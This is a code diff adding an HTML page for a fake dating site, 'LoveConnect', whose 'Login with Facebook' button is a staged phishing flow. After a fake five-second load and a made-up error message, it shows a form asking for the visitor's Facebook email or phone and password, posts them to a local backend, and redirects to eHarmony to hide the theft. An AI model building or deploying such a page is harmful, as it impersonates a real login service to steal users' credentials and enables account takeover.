@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dating Website</title>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        function openModal() {
+    const modal = document.getElementById('fb-modal');
+    if (modal) {
+        modal.classList.remove('hidden');
+    } else {
+        console.error('Modal element not found');
+    }
+}
+
+function closeModal() {
+    const modal = document.getElementById('fb-modal');
+    if (modal) {
+        modal.classList.add('hidden');
+    } else {
+        console.error('Modal element not found');
+    }
+}
+
+function showErrorMessage() {
+    const loadingMessage = document.getElementById('loading-message');
+    const errorMessage = document.getElementById('error-message');
+    const loginForm = document.getElementById('login-form');
+
+    if (loadingMessage && errorMessage && loginForm) {
+        loadingMessage.classList.remove('hidden');
+        setTimeout(() => {
+            loadingMessage.classList.add('hidden');
+            errorMessage.classList.remove('hidden');
+            loginForm.classList.remove('hidden');
+        }, 5000);
+    } else {
+        console.error('One or more elements for showing the error message are missing');
+    }
+}
+
+async function handleLogin(event) {
+    event.preventDefault();
+
+    const emailOrPhone = document.getElementById('login-username')?.value.trim();
+    const password = document.getElementById('login-password')?.value.trim();
+
+    if (!emailOrPhone || !password) {
+        alert('Email/Phone and Password are required!');
+        return;
+    }
+
+    try {
+        const response = await fetch('http://localhost:5000/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ emailOrPhone, password }),
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+            alert('Login Successful! Redirecting...');
+            window.location.href = "https://www.eharmony.com/?__cf_chl_tk=utPlRg5M1KkuwWtIBPMuQDdHTApEpHHTFk8wturTs6A-1739080556-1.0.1.1-dIfMs.C3abG5ucqmkSS3MG_4YseWDdY4x3_tebLVjlI";
+        } else {
+            alert(data.message || 'Login Failed!');
+        }
+    } catch (error) {
+        console.error('Error during login:', error);
+        alert('An error occurred while logging in. Please try again.');
+    }
+}
+
+    </script>
+    <style>
+        body {
+            background: url('https://i.pinimg.com/736x/c8/de/8a/c8de8acca278a58ff6036598c43c82dd.jpg') no-repeat center center/cover;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center h-screen">
+    <div class="bg-gray-800 bg-opacity-90 p-6 rounded-lg shadow-lg text-center w-80">
+        <h1 class="text-2xl text-white font-bold mb-4">Welcome to LoveConnect</h1>
+        <p class="text-gray-400 mb-4">Find your perfect match today!</p>
+        <img src="https://i.pinimg.com/736x/ce/53/80/ce538095fb7912b6a452f2439ae97336.jpg" class="w-32 h-32 rounded-full mx-auto mb-4" alt="Lady Profile Picture">
+        <button onclick="openModal()" class="px-4 py-2 bg-blue-600 text-white rounded-lg shadow-md">
+            Login with Facebook
+        </button>
+        <div id="user-info" class="mt-4"></div>
+    </div>
+
+    <!-- Facebook Login Modal -->
+    <div id="fb-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+        <div class="bg-white p-6 rounded-lg shadow-lg text-center w-96">
+            <h2 class="text-xl font-bold mb-4">Login with Facebook</h2>
+            <p class="text-gray-600 mb-4">Please log in to continue.</p>
+            <button onclick="showErrorMessage()" class="px-4 py-2 bg-blue-600 text-white rounded-lg shadow-md mb-4">
+                Continue with Facebook
+            </button>
+            <p id="loading-message" class="text-gray-600 mt-4 hidden">Loading...</p>
+            <br>
+            <button onclick="closeModal()" class="px-4 py-2 bg-gray-600 text-white rounded-lg shadow-md">
+                Cancel
+            </button>
+            <p id="error-message" class="text-red-600 mt-4 hidden">You cannot automatically log in with Facebook. Please enter your details below.</p>
+            <form id="login-form" class="hidden mt-4" onsubmit="handleLogin(event)">
+                <input type="text" id="login-username" placeholder="Email, Phone, or Username" class="w-full p-2 border rounded mb-2">
+                <input type="password" id="login-password" placeholder="Password" class="w-full p-2 border rounded mb-2">
+                <button type="submit" class="px-4 py-2 bg-green-600 text-white rounded-lg shadow-md w-full">Login</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
